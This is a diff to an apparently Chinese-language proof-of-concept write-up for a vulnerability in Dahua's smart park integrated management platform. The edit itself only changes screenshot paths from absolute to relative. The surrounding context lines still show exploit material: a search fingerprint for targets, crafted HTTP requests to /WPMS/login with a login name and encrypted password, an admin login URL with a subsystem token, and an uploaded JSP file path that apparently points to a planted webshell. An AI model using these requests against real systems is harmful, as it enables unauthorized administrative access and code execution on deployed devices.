@@ -16,7 +16,7 @@ app="dahua-智慧园区综合管理平台"
 
 ## 漏洞复现
 
-![image-20230704114553099](D:\TMP_FILE\awesome-poc\iot\images\image-20230704114553099.png)
+![image-20230704114553099](./images/image-20230704114553099.png)
 
 验证POC
 
@@ -89,7 +89,7 @@ User-Agent: Go-http-client/1.1
 {"loginName":"luqaahkf"}
 ```
 
-![image-20230704114626015](D:\TMP_FILE\awesome-poc\iot\images\image-20230704114626015.png)
+![image-20230704114626015](./images/image-20230704114626015.png)
 
 ```
 POST /WPMS/login HTTP/1.1
@@ -102,13 +102,13 @@ User-Agent: Go-http-client/1.1
 {"loginName":"luqaahkf","loginPass":"IxID6I8gKNSkCgu5UMwfRAhZpyvKKzu9q+dUngiieHiCTA52x3/uNB17NmAOletbzTOT46fLE5AOOMqMaqdDLA5rcsB3/Gql1qYwbNWLB6orKWpWEr9asUeNi/3ccIb95NUAXS1yn0l3ks94jbGT/CYbNq+JiBAeYlwcfdrqYkM=","timestamp":"16853622671401904168273612873678126378126387"}
 ```
 
-![image-20230704114644296](D:\TMP_FILE\awesome-poc\iot\images\image-20230704114644296.png)
+![image-20230704114644296](./images/image-20230704114644296.png)
 
 ```
 /admin/login_login.action?subSystemToken=87a629bc14298c1533d8b52dd63e87f7
 ```
 
-![image-20230704114655894](D:\TMP_FILE\awesome-poc\iot\images\image-20230704114655894.png)
+![image-20230704114655894](./images/image-20230704114655894.png)
 
 ```
 /upload/axqvssmz.jsp
